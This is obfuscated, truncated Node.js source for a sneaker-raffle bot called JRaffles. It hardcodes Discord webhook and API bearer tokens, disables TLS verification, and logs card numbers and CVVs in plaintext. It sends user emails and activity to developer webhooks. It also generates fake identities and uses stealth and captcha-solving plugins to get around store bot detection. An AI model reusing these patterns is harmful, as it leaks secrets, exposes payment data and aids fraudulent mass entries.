process['env']['NODE_TLS_REJECT_UNAUTHORIZED'] = '0';
const _0x147d24 = require('fs'), _0x4dfbf3 = new Date()['toDateString']() + '\x20' + new Date()['getHours']() + '\x20' + new Date()['getMinutes']() + '\x20' + new Date()['getSeconds']();
function _0xd0b5df(_0x3bb03a) {
    const _0x40cc35 = _0x147d24['createWriteStream'](_0x3bb03a, { 'flags': 'a' }), _0x5c45b7 = console['log'];
    console['log'] = function () {
        const _0x14b246 = Array['prototype']['slice']['call'](arguments), _0x22f8f2 = _0x14b246['join']('\x20') + '\x0a';
        _0x40cc35['write'](_0x22f8f2), _0x5c45b7['apply'](console, _0x14b246);
    };
}
_0xd0b5df('../logs/log\x20' + _0x4dfbf3);
var _0x4fc718 = require('tough-cookie'), _0x4ce16c = require('node-imap'), _0x299931 = require('util')['inspect'];
const _0x425966 = require('mailparser')['simpleParser'], { EmbedBuilder: _0x58d12d } = require('discord.js');
var _0x26d9fb = require('exe');
const { execFile: _0x2642cd } = require('child_process'), _0x510708 = require('puppeteer-extra'), _0x397b4a = require('cross-spawn'), _0x3b4fcd = require('puppeteer-extra-plugin-recaptcha'), _0x4fd89e = require('puppeteer-extra-plugin-stealth'), _0x3e3bb6 = require('chalk'), _0xf5e41e = require('node-bash-title'), _0x3c935b = require('axios'), _0x22245b = require('papaparse');
var _0x15867c = require('random-name');
const _0x7b6702 = require('request');
var _0x59655c = require('prompt');
const _0x337161 = _0x7b6702['jar']();
var _0x255a87 = {};
const _0x457658 = '1067398661929181186/wvxr1d4nwFDFE-hAKBisU_mVWLloqatitfWvCqqIv38EUYiJMm_Pr3VKsuLsUBKN3PPj', _0x2a88b6 = '1067398862056210432/TZs7kSEcDtUD13Vzl7VQhculxdtocZI8HKU7l_fW_W0qthftmSpHxNDY9NB3Hc4v6Yhy', _0x38921a = '1068515411877957743/t_TXlLhYbeQmPL19hyGeNqi1G0KPT8KCBYOVOcryGMvXPfIUBEpNZRBCC1j7OFRej4A6', _0x245f85 = '1068519704525807616/luGgvM1ZbR7g1zM5-10y5yceL2OGVCjrlkB6XxQL-hdoHUJ6hwSVAn6vVNyieHWLqPHE', _0x4d00c2 = '1070657276525940746/GSfXwIxjuRjwmP3sTDw73M4V2P5OJqMFgZyECtpBwFmtXGINvj1xFsVsZ2KwGBpJNHpn', _0x9c186b = '1072865476457287711/EePVQu0bb06IdHG3FfG7M-JDaE-38prupCPoCqaduP6mG_tsshUSaKidyfyVx0YgNC7e';
var _0x241a4d = 'https://discord.com/api/webhooks/', _0x23cf5b = '' + _0x241a4d + _0x38921a, _0xc2690c = '' + _0x241a4d + _0x245f85, _0x4fb406 = '' + _0x241a4d + _0x457658, _0x991bd5 = '' + _0x241a4d + _0x2a88b6, _0x5d80c9 = '' + _0x241a4d + _0x4d00c2, _0x4a8a26 = '' + _0x241a4d + _0x9c186b;
const _0x42dd19 = JSON['parse'](_0x147d24['readFileSync']('country.json', 'utf-8')), _0x2fda23 = JSON['parse'](_0x147d24['readFileSync']('../package.json', 'utf-8')), _0x1ad228 = _0x2fda23['version'];
var _0x20d7ea, _0xf0d869, _0xf98880, _0x4f86e7, _0x3bf742, _0xcc4aaf, _0x26c985, _0x574e52;
const _0x1001a1 = 'pk_7R7rRwMpveiR8OufEx9xIDMdU8Y95GgvGLF59wWRqklMwhXdpDnh5sN2KfaPHjEe';
let _0xf6ecd5 = ![];
const _0x552cdf = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', _0x185647 = '0123456789';
var _0x3ce0b9 = _0x552cdf['split']('');
const _0x37a6e8 = require('auto-git-update'), _0x3a5228 = {
    'repository': 'https://github.com/Jarno97/JRafflesBot',
    'branch': 'main',
    'fromReleases': ![],
    'tempLocation': 'C:/temp/jraffles',
    'ignoreFiles': [
        'settings.json',
        'proxies.txt',
        'tasks/maha.csv',
        'tasks/footshop.csv',
        'tasks/afew.csv',
        'tasks/oqium.csv',
        'tasks/patta.csv',
        'accounts/patta.csv',
        'tasks/kickz.csv',
        'accounts/kickz-verified.csv',
        'accounts/kickz-unverified.csv'
    ]
}, _0x116131 = new _0x37a6e8(_0x3a5228);
async function _0xd029e6() {
    _0x3bf742 = _0x147d24['readdirSync']('../proxies'), _0x4f86e7 = _0x147d24['readdirSync']('../tasks'), !_0x147d24['existsSync']('../accounts/fenom.csv') && _0x147d24['writeFileSync']('../accounts/fenom.csv', 'Email,Password\x0a'), !_0x147d24['existsSync']('../accounts/paypal.csv') && _0x147d24['writeFileSync']('../accounts/paypal.csv', 'Email,Password,Proxy\x0a'), !_0x147d24['existsSync']('../accounts/bstn.csv') && _0x147d24['writeFileSync']('../accounts/bstn.csv', 'Email,Password\x0a'), !_0x147d24['existsSync']('../accounts/eql.csv') && _0x147d24['writeFileSync']('../accounts/eql.csv', 'Email,Password,Phone\x0a'), !_0x147d24['existsSync']('../failed-tasks.csv') && _0x147d24['writeFileSync']('../failed-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), !_0x147d24['existsSync']('../successful-tasks.csv') && _0x147d24['writeFileSync']('../successful-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), _0x255a87 = JSON['parse'](_0x147d24['readFileSync']('../settings.json', 'utf-8')), !_0x255a87['delay'] && (_0x255a87['delay'] = 0x3c, _0x147d24['writeFileSync']('../settings.json', JSON['stringify'](_0x255a87, null, 0x2))), !_0x255a87['threads'] && (_0x255a87['threads'] = 0x1, _0x147d24['writeFileSync']('../settings.json', JSON['stringify'](_0x255a87, null, 0x2))), !_0x255a87['masterMail'] && (_0x255a87['masterMail'] = 'yourmail@gmail.com', _0x147d24['writeFileSync']('../settings.json', JSON['stringify'](_0x255a87, null, 0x2))), !_0x255a87['CapSolver'] && (_0x255a87['CapSolver'] = 'yourkeyhere', _0x147d24['writeFileSync']('../settings.json', JSON['stringify'](_0x255a87, null, 0x2))), !_0x255a87['masterPassword'] && (_0x255a87['masterPassword'] = 'read\x20the\x20guide\x20on\x20how\x20to\x20get\x20an\x20APP\x20PASSWORD', _0x147d24['writeFileSync']('../settings.json', JSON['stringify'](_0x255a87, null, 0x2))), !_0x255a87['captchaKey'] && (_0x255a87['captchaKey'] = '', _0x147d24['writeFileSync']('../settings.json', JSON['stringify'](_0x255a87, null, 0x2))), !_0x255a87['useRandomProxy'] && (_0x255a87['useRandomProxy'] = !![], _0x147d24['writeFileSync']('../settings.json', JSON['stringify'](_0x255a87, null, 0x2))), !_0x255a87['shuffleTasks'] && (_0x255a87['shuffleTasks'] = ![], _0x147d24['writeFileSync']('../settings.json', JSON['stringify'](_0x255a87, null, 0x2))), !_0x255a87['webhook'] && (_0x255a87['webhook'] = '', _0x147d24['writeFileSync']('../settings.json', JSON['stringify'](_0x255a87, null, 0x2))), _0x255a87['delay'] <= 0x1388 && (_0x255a87['delay'] = _0x255a87['delay'] * 0x3e8), _0x255a87['AfewDelay'] && (delete _0x255a87['AfewDelay'], _0x147d24['writeFileSync']('../settings.json', JSON['stringify'](_0x255a87, null, 0x2))), _0x255a87['MahaDelay'] && (delete _0x255a87['MahaDelay'], _0x147d24['writeFileSync']('../settings.json', JSON['stringify'](_0x255a87, null, 0x2))), _0x255a87['footshopDelay'] && (delete _0x255a87['footshopDelay'], _0x147d24['writeFileSync']('../settings.json', JSON['stringify'](_0x255a87, null, 0x2))), _0x255a87['MahaDelay'] = _0x255a87['delay'], _0x241a4d = _0x255a87['webhook'], _0xcc4aaf = _0x255a87['licenseKey'];
}
let _0x47c21c, _0x12f0a8 = [], _0x3f3d59;
const _0x4fda60 = _0x2af791 => new Promise(_0x3ea43e => setTimeout(_0x3ea43e, _0x2af791));
function _0x8891f8(_0x5ed93a, _0x173248) {
    return Math['floor'](Math['random']() * (_0x173248 - _0x5ed93a + 0x1) + _0x5ed93a);
}
function _0x18edf2(_0x232488) {
    let _0x217048 = _0x232488['length'], _0x1dc44b;
    while (_0x217048 != 0x0) {
        _0x1dc44b = Math['floor'](Math['random']() * _0x217048), _0x217048--, [_0x232488[_0x217048], _0x232488[_0x1dc44b]] = [
            _0x232488[_0x1dc44b],
            _0x232488[_0x217048]
        ];
    }
    return _0x232488;
}
async function _0xd6ddd7(_0x293a88) {
    try {
        return _0x3c935b['post']('https://api.whop.com/api/v2/memberships/' + _0x293a88 + '/validate_license', { 'metadata': { 'key': '' } }, {
            'headers': {
                'Authorization': 'Bearer\x20DRT4qDTPjhk0dbWMnuTDrMuGiUh6MogGpjZL6gSDoLU',
                'Content-Type': 'application/json'
            }
        });
    } catch (_0x38fba4) {
        console['log']('Error\x20checking\x20license:\x20' + _0x38fba4['message']);
    }
}
async function _0x3cc189(_0x2b5e06) {
    console['clear']();
    if (_0x2b5e06 == 'AWGH-0N92-JE6S-HOHU') {
        console['log']('Please\x20paste\x20your\x20key\x20here:');
        var _0xc2d23 = await _0x59655c['get']('License');
        if (_0xc2d23['License'] == 'AWGH-0N92-JE6S-HOHU')
            return console['log']('Error\x20please\x20use\x20the\x20key\x20on\x20the\x20JRaffles\x20dashboard'), await _0x4fda60(0xbb8), _0x3cc189(_0x2b5e06);
        _0x2b5e06 = _0xc2d23['License'], _0x255a87['licenseKey'] = _0x2b5e06, _0xcc4aaf = _0x2b5e06, _0x147d24['writeFileSync']('../settings.json', JSON['stringify'](_0x255a87));
    }
    console['log']('Checking\x20license\x20' + _0xcc4aaf + '...'), await _0x4fda60(0x320);
    const _0x1048f2 = await _0xd6ddd7(_0x2b5e06);
    _0x26c985 = JSON['stringify'](_0x1048f2['data']['discord']['username'])['substring'](0x1)['slice'](0x0, -0x1), _0x574e52 = JSON['stringify'](_0x1048f2['data']['discord']['image_url'])['substring'](0x1)['slice'](0x0, -0x1);
    if (!_0x1048f2)
        return console['log']('License\x20not\x20found');
    if (!_0x1048f2['data'])
        return console['log']('License\x20not\x20bound');
    return _0x1048f2['data']['valid'] ? (console['log']('License\x20is\x20good\x20to\x20go!'), _0xf6ecd5 = !![]) : (console['log']('Could\x20not\x20find\x20license..'), _0xf6ecd5 = ![]);
}
async function _0x127184() {
    var _0x2af63b = await _0x59655c['get']('Module');
    return console['clear'](), _0x2af63b['Module'];
}
;
async function _0x3a0959() {
    var _0x22f77d = await _0x59655c['get']('Setting');
    return console['clear'](), _0x22f77d['Setting'];
}
async function _0xd08fc1(_0x38a503) {
    var _0x265439 = [];
    for (file of _0x4f86e7) {
        var _0x420558 = _0x147d24['readFileSync']('../tasks/' + file, 'utf-8');
        tsParse = _0x22245b['parse'](_0x420558, { 'header': !![] })['data'], tsParse[0x0]['Store'] == _0x38a503['store'] && _0x265439['push'](file);
    }
    !_0x265439['length'] == 0x0 && (_0x4f86e7 = _0x265439);
    console['log']('Choose\x20A\x20File\x20to\x20Run\x20\x0a');
    for (var _0x346470 = 0x0; _0x346470 < _0x4f86e7['length']; _0x346470++) {
        console['log']('\x20(' + _0x346470 + ')\x20' + _0x4f86e7[_0x346470]);
    }
    console['log']('');
    var _0x382ab5 = await _0x59655c['get']('Task');
    if (_0x382ab5['Task'] > _0x4f86e7['length'] - 0x1 || isNaN(_0x382ab5['Task']) == !![])
        return console['log']('Invalid\x20selection'), await _0x4fda60(0x3e8), _0xd08fc1();
    var _0x288524 = _0x147d24['readFileSync']('../tasks/' + _0x4f86e7[_0x382ab5['Task']], 'utf-8');
    return _0xf98880 = _0x22245b['parse'](_0x288524, { 'header': !![] })['data'], console['clear'](), console['log']('Running\x20' + _0x3e3bb6['blue'](_0x4f86e7[_0x382ab5['Task']])), _0x20d7ea = _0x4f86e7[_0x382ab5['Task']], _0xf98880;
}
async function _0x49cd47() {
    console['clear'](), console['log']('Choose\x20Proxies\x20to\x20Use\x20\x0a');
    for (var _0x5e8d73 = 0x0; _0x5e8d73 < _0x3bf742['length']; _0x5e8d73++) {
        console['log']('\x20(' + _0x5e8d73 + ')\x20' + _0x3bf742[_0x5e8d73]);
    }
    console['log']('');
    var _0x1d8845 = await _0x59655c['get']('Proxies');
    if (_0x1d8845['Proxies'] > _0x3bf742['length'] - 0x1 || isNaN(_0x1d8845['Proxies']) == !![])
        return console['log']('Invalid\x20selection'), await _0x4fda60(0x3e8), _0x49cd47();
    var _0x1d0398 = _0x147d24['readFileSync']('../proxies/' + _0x3bf742[_0x1d8845['Proxies']], 'utf-8')['split']('\x0a');
    let _0x2b5af9 = _0x1d0398['map']((_0x461e68, _0x21b396) => {
        sanatizeProxy = _0x461e68['replace']('\x0d', '');
        if (_0x1d0398[_0x21b396 + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0xf0d869 = _0x3bf742[_0x1d8845['Proxies']], console['clear'](), _0x2b5af9;
}
async function _0x393de4() {
    var _0xc1ecdc = await _0x59655c['get']('Value');
    return console['clear'](), _0xc1ecdc['Value'];
}
async function _0x15c36e(_0x282a4c) {
    console['clear'](), console['log']('What\x20would\x20you\x20like\x20to\x20do?\x20\x0a');
    for (var _0x3bb407 = 0x0; _0x3bb407 < _0x282a4c['length']; _0x3bb407++) {
        console['log']('\x20(' + _0x3bb407 + ')\x20[' + _0x282a4c[_0x3bb407]['name'] + ']');
    }
    ;
    console['log']('');
    var _0x1d7cd9 = await _0x59655c['get']('Module');
    return _0x1d7cd9['Module'];
}
async function _0x20b752() {
    var _0x365a7f = await _0x59655c['get']('Password');
    return console['clear'](), _0x365a7f['Password'];
}
;
async function _0x1aa57e() {
    var _0x330aa7 = await _0x59655c['get']('Links');
    return _0x330aa7['Links'];
}
;
async function _0x2b7c6e() {
    console['log']('Choose\x20a\x20Raffle\x20to\x20enter:\x20\x0a');
    for (var _0x421715 = 0x0; _0x421715 < _0x12f0a8['length']; _0x421715++) {
        console['log']('\x20(' + _0x421715 + ')\x20' + _0x12f0a8[_0x421715]);
    }
    ;
    console['log']();
    let _0x10e3ea = await _0x59655c['get']('Product');
    return console['clear'](), _0x10e3ea['Product'];
}
;
function _0x46dcc5() {
    var _0x35f9d7 = new Date(Date['now']())['toLocaleTimeString']();
    return _0x35f9d7;
}
;
function _0x4c12fd() {
    var _0x16913b = new Date(Date['now']())['toLocaleString']();
    return _0x16913b['replace'](',', '');
}
async function _0xb6cfae(_0x9cae1f, _0x312e24) {
    let _0x3209a2 = { 'headers': { 'content-type': 'application/json' } };
    if (_0x1ad228 != 'devkey') {
        await _0x3c935b['post'](_0x9cae1f, _0x312e24, _0x3209a2);
        return;
    }
    return console['log']('devkey\x20settings\x20enabled,\x20not\x20sending\x20webhooks');
}
;
async function _0x1523c9(_0x4462a5, _0x21beb6, _0x5b066a, _0x106a47, _0x151a0f) {
    if (!_0x106a47 && _0x5b066a == 'dev') {
        var _0x3e355e = new _0x58d12d()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Raffle\x20Entry')['setAuthor']({
            'name': 'JRaffles',
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
            'url': 'https://twitter.com/JRaffles_'
        })['setThumbnail'](_0x21beb6['logo'])['addFields']({
            'name': 'Store',
            'value': '' + _0x21beb6['store'],
            'inline': !![]
        })['addFields']({
            'name': 'Size',
            'value': '' + _0x4462a5['Size'],
            'inline': !![]
        })['addFields']({
            'name': 'Delay',
            'value': '' + _0x255a87['delay'],
            'inline': !![]
        })['addFields']({
            'name': 'User',
            'value': '' + _0x26c985,
            'inline': !![]
        })['addFields']({
            'name': 'URL',
            'value': '' + _0x4462a5['Url'],
            'inline': !![]
        })['addFields']({
            'name': 'Mail',
            'value': '' + _0x4462a5['Email'],
            'inline': !![]
        })['setTimestamp']()['setFooter']({
            'text': 'JRaffles\x20v' + _0x1ad228,
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
        });
        return _0x3e355e['data'];
    } else {
        if (_0x106a47 && _0x5b066a == 'dev') {
            var _0x3e355e = new _0x58d12d()['setColor'](0xc0d6d6)['setTitle']('Failed\x20Raffle\x20Entry')['setAuthor']({
                'name': 'JRaffles',
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                'url': 'https://twitter.com/JRaffles_'
            })['setThumbnail'](_0x21beb6['logo'])['addFields']({
                'name': 'User',
                'value': '' + _0x26c985,
                'inline': !![]
            }, {
                'name': 'Store',
                'value': '' + _0x21beb6['store'],
                'inline': !![]
            }, {
                'name': 'Size',
                'value': '' + _0x4462a5['Size'],
                'inline': !![]
            }, {
                'name': 'Delay',
                'value': '' + _0x255a87['delay'],
                'inline': !![]
            })['addFields']({
                'name': 'ERROR',
                'value': '' + _0x151a0f,
                'inline': !![]
            })['addFields']({
                'name': 'URL',
                'value': '' + _0x4462a5['Url']
            })['addFields']({
                'name': 'Mail',
                'value': '' + _0x4462a5['Email'],
                'inline': !![]
            })['setTimestamp']()['setFooter']({
                'text': 'JRaffles\x20v' + _0x1ad228,
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
            });
            return _0x3e355e['data'];
        } else {
            if (_0x5b066a == 'pub') {
                var _0x3e355e = new _0x58d12d()['setColor'](0xc0d6d6)['setTitle']('Succesful\x20Raffle\x20Entry')['setAuthor']({
                    'name': 'JRaffles',
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                    'url': 'https://twitter.com/JRaffles_'
                })['setThumbnail'](_0x21beb6['logo'])['addFields']({
                    'name': 'Store',
                    'value': '' + _0x21beb6['store'],
                    'inline': !![]
                }, {
                    'name': 'Size',
                    'value': '' + _0x4462a5['Size'],
                    'inline': !![]
                }, {
                    'name': 'Delay',
                    'value': '' + _0x255a87['delay'],
                    'inline': !![]
                })['addFields']({
                    'name': 'URL',
                    'value': '||' + _0x4462a5['Url'] + '||'
                })['setTimestamp']()['setFooter']({
                    'text': 'JRaffles\x20v' + _0x1ad228,
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                });
                return _0x3e355e['data'];
            } else {
                if (_0x5b066a == 'acc' && !_0x106a47) {
                    var _0x3e355e = new _0x58d12d()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generated')['setAuthor']({
                        'name': 'JRaffles',
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                        'url': 'https://twitter.com/JRaffles_'
                    })['setThumbnail'](_0x21beb6['logo'])['addFields']({
                        'name': 'User',
                        'value': '' + _0x26c985,
                        'inline': !![]
                    }, {
                        'name': 'Store',
                        'value': '' + _0x21beb6['store'],
                        'inline': !![]
                    }, {
                        'name': 'Delay',
                        'value': '' + _0x255a87['delay'],
                        'inline': !![]
                    })['setTimestamp']()['setFooter']({
                        'text': 'JRaffles\x20v' + _0x1ad228,
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                    });
                    return _0x3e355e['data'];
                } else {
                    if (_0x5b066a == 'acc' && _0x106a47) {
                        var _0x3e355e = new _0x58d12d()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generation\x20Failed')['setAuthor']({
                            'name': 'JRaffles',
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                            'url': 'https://twitter.com/JRaffles_'
                        })['setThumbnail'](_0x21beb6['logo'])['addFields']({
                            'name': 'User',
                            'value': '' + _0x26c985,
                            'inline': !![]
                        }, {
                            'name': 'Error',
                            'value': '' + _0x151a0f,
                            'inline': !![]
                        }, {
                            'name': 'Store',
                            'value': '' + _0x21beb6['store'],
                            'inline': !![]
                        }, {
                            'name': 'Delay',
                            'value': '' + _0x255a87['delay'],
                            'inline': !![]
                        })['setTimestamp']()['setFooter']({
                            'text': 'JRaffles\x20v' + _0x1ad228,
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                        });
                        return _0x3e355e['data'];
                    } else {
                        if (_0x5b066a == 'open') {
                            var _0x3e355e = new _0x58d12d()['setColor'](0xc0d6d6)['setTitle']('User\x20Opened\x20JRaffles')['setAuthor']({
                                'name': 'JRaffles',
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                'url': 'https://twitter.com/JRaffles_'
                            })['setThumbnail'](_0x574e52)['addFields']({
                                'name': 'User',
                                'value': '' + _0x26c985,
                                'inline': !![]
                            })['setTimestamp']()['setFooter']({
                                'text': 'JRaffles\x20v' + _0x1ad228,
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                            });
                            return _0x3e355e['data'];
                        } else {
                            if (!_0x106a47 && _0x5b066a == 'ver') {
                                var _0x3e355e = new _0x58d12d()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Verification')['setAuthor']({
                                    'name': 'JRaffles',
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                    'url': 'https://twitter.com/JRaffles_'
                                })['setThumbnail'](_0x21beb6['logo'])['addFields']({
                                    'name': 'User',
                                    'value': '' + _0x26c985,
                                    'inline': !![]
                                }, {
                                    'name': 'Store',
                                    'value': '' + _0x21beb6['store'],
                                    'inline': !![]
                                }, {
                                    'name': 'Delay',
                                    'value': '' + _0x255a87['delay'],
                                    'inline': !![]
                                })['setTimestamp']()['setFooter']({
                                    'text': 'JRaffles\x20v' + _0x1ad228,
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                });
                                return _0x3e355e['data'];
                            } else {
                                if (_0x106a47 && _0x5b066a == 'ver') {
                                    var _0x3e355e = new _0x58d12d()['setColor'](0xc0d6d6)['setTitle']('Verification\x20Failed')['setAuthor']({
                                        'name': 'JRaffles',
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                        'url': 'https://twitter.com/JRaffles_'
                                    })['setThumbnail'](_0x21beb6['logo'])['addFields']({
                                        'name': 'User',
                                        'value': '' + _0x26c985,
                                        'inline': !![]
                                    }, {
                                        'name': 'Error',
                                        'value': '' + _0x151a0f,
                                        'inline': !![]
                                    }, {
                                        'name': 'Store',
                                        'value': '' + _0x21beb6['store'],
                                        'inline': !![]
                                    }, {
                                        'name': 'Delay',
                                        'value': '' + _0x255a87['delay'],
                                        'inline': !![]
                                    })['setTimestamp']()['setFooter']({
                                        'text': 'JRaffles\x20v' + _0x1ad228,
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                    });
                                    return _0x3e355e['data'];
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}
async function _0x436f00(_0x4b2880, _0x482e4f) {
    var _0x3bc3c4 = _0x4b2880[_0x482e4f]['Address1']['split'](''), _0x20ccb8 = _0x4b2880[_0x482e4f]['Address2']['split'](''), _0x4abdd2 = _0x4b2880[_0x482e4f]['Email']['split']('@');
    for (var _0x643861 = 0x0; _0x643861 < _0x3bc3c4['length']; _0x643861++) {
        if (_0x3bc3c4[_0x643861] == 'X') {
            var _0x5c2fb7 = Math['round'](Math['random']() * (_0x552cdf['length'] - 0x1));
            _0x3bc3c4[_0x643861] = _0x3ce0b9[_0x5c2fb7];
        }
    }
    ;
    for (var _0x643861 = 0x0; _0x643861 < _0x20ccb8['length']; _0x643861++) {
        if (_0x20ccb8[_0x643861] == 'X') {
            var _0x5c2fb7 = Math['round'](Math['random']() * (_0x552cdf['length'] - 0x1));
            _0x20ccb8[_0x643861] = _0x3ce0b9[_0x5c2fb7];
        }
    }
    ;
    _0x4b2880[_0x482e4f]['FirstName']['toUpperCase']() == 'RANDOM' && (_0x4b2880[_0x482e4f]['FirstName'] = _0x15867c['first']());
    _0x4b2880[_0x482e4f]['LastName']['toUpperCase']() == 'RANDOM' && (_0x4b2880[_0x482e4f]['LastName'] = _0x15867c['last']());
    _0x4abdd2[0x0]['toUpperCase']() == 'RANDOM' ? _0x4abdd2[0x0] = '' + _0x15867c['first']() + _0x15867c['last']() + _0x8891f8(0x1, 0x3e7) + '@' : _0x4abdd2[0x0] = _0x4abdd2[0x0] + '@';
    _0x4b2880[_0x482e4f]['Email'] = _0x4abdd2['join'](''), _0x4b2880[_0x482e4f]['Address1'] = _0x3bc3c4['join'](''), _0x4b2880[_0x482e4f]['Address2'] = _0x20ccb8['join']('');
    _0x4b2880[_0x482e4f]['Phone'] == 'RANDOM' && (_0x4b2880[_0x482e4f]['Phone'] = '0' + _0x8891f8(0x5f5e100, 0x3b9ac9ff));
    if (_0x4b2880[_0x482e4f]['Follower']['toUpperCase']() == 'RANDOM') {
        var _0x1ab85a = _0x8891f8(0x1, 0x270f);
        _0x4b2880[_0x482e4f]['Follower'] = '' + _0x15867c['first']() + _0x15867c['last']() + _0x1ab85a + '\x20';
    }
    _0x4b2880[_0x482e4f]['HouseNumber']['toUpperCase']() == 'RANDOM' && (_0x4b2880[_0x482e4f]['HouseNumber'] = _0x8891f8(0x1, 0xc8));
    if (_0x4b2880[_0x482e4f]['Address1']['toUpperCase']() == 'RANDOM') {
        var _0x88f973 = Math['round'](Math['random']() * (_0x552cdf['length'] - 0x1)), _0x35e080 = _0x3ce0b9[_0x88f973];
        _0x4b2880[_0x482e4f]['Address1'] = _0x15867c['last']() + 'straat', _0x4b2880[_0x482e4f]['Zip'] == '' && (_0x4b2880[_0x482e4f]['Postcode'] = _0x8891f8(0x3e8, 0x270f) + '\x20' + _0x35e080 + _0x35e080, _0x4b2880[_0x482e4f]['Zip'] = _0x4b2880[_0x482e4f]['Postcode']), _0x4b2880[_0x482e4f]['HouseNumber'] = '' + _0x8891f8(0x1, 0xc8);
    }
    return;
}
;
async function _0x2540d5(_0x4e2747, _0x419642) {
    _0x147d24['appendFileSync']('../failed-tasks.csv', _0x4c12fd() + ',' + _0x419642['store'] + ',' + _0x419642['name'] + ',' + _0x4e2747['Url'] + ',' + _0x4e2747['Size'] + ',' + _0x4e2747['Follower'] + ',' + _0x4e2747['FirstName'] + ',' + _0x4e2747['LastName'] + ',' + _0x4e2747['Address1'] + ',' + _0x4e2747['Address2'] + ',' + _0x4e2747['HouseNumber'] + ',' + _0x4e2747['Zip'] + ',' + _0x4e2747['City'] + ',' + _0x4e2747['State'] + ',' + _0x4e2747['Country'] + ',' + _0x4e2747['Phone'] + ',' + _0x4e2747['Email'] + ',' + _0x4e2747['Password'] + ',' + _0x4e2747['PaymentMethod'] + ',' + _0x4e2747['CardType'] + ',' + _0x4e2747['NameOnCard'] + ',' + _0x4e2747['CardNumber'] + ',' + _0x4e2747['ExpiryDate'] + ',' + _0x4e2747['CVV'] + ',' + _0x4e2747['IsBillingSame'] + ',,,,,,,,,,\x0a');
}
async function _0x8bf342(_0x8b75c4, _0xe2dc5c) {
    _0x147d24['appendFileSync']('../successful-tasks.csv', _0x4c12fd() + ',' + _0xe2dc5c['store'] + ',' + _0xe2dc5c['name'] + ',' + _0x8b75c4['Url'] + ',' + _0x8b75c4['Size'] + ',' + _0x8b75c4['Follower'] + ',' + _0x8b75c4['FirstName'] + ',' + _0x8b75c4['LastName'] + ',' + _0x8b75c4['Address1'] + ',' + _0x8b75c4['Address2'] + ',' + _0x8b75c4['HouseNumber'] + ',' + _0x8b75c4['Zip'] + ',' + _0x8b75c4['City'] + ',' + _0x8b75c4['State'] + ',' + _0x8b75c4['Country'] + ',' + _0x8b75c4['Phone'] + ',' + _0x8b75c4['Email'] + ',' + _0x8b75c4['Password'] + ',' + _0x8b75c4['PaymentMethod'] + ',' + _0x8b75c4['CardType'] + ',' + _0x8b75c4['NameOnCard'] + ',' + _0x8b75c4['CardNumber'] + ',' + _0x8b75c4['ExpiryDate'] + ',' + _0x8b75c4['CVV'] + ',' + _0x8b75c4['IsBillingSame'] + ',,,,,,,,,,\x0a');
}
function _0x487c4c() {
    let _0x8a620b = proxyFile['split']('\x0a'), _0x1fcc0e = _0x8a620b['map']((_0x1f9c53, _0x5e5c06) => {
        sanatizeProxy = _0x1f9c53['replace']('\x0d', '');
        if (_0x8a620b[_0x5e5c06 + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x1fcc0e;
}
;
async function _0x9ecd61(_0x49be1e, _0x3082cc) {
    if (_0x514634 != 'yes')
        var _0x514634 = '', _0x33cbf6 = 0x0;
    async function _0x16493a() {
        var _0x49f256 = _0x147d24['readFileSync']('../accounts/paypal.csv', 'utf-8');
        let _0x2c71af = _0x22245b['parse'](_0x49f256, { 'header': !![] })['data'];
        console['log']('Choose\x20a\x20Paypal\x20to\x20use:\x0a');
        for (var _0x501ea0 = 0x0; _0x501ea0 < _0x2c71af['length']; _0x501ea0++) {
            console['log']('(' + _0x501ea0 + ')\x20' + _0x2c71af[_0x501ea0]['Email']);
        }
        console['log']('\x0a(' + _0x2c71af['length'] + ')\x20' + _0x3e3bb6['cyan']('Add\x20a\x20new\x20account'));
        let _0x273685 = await _0x59655c['get']('Option');
        if (_0x273685['Option'] < _0x2c71af['length'])
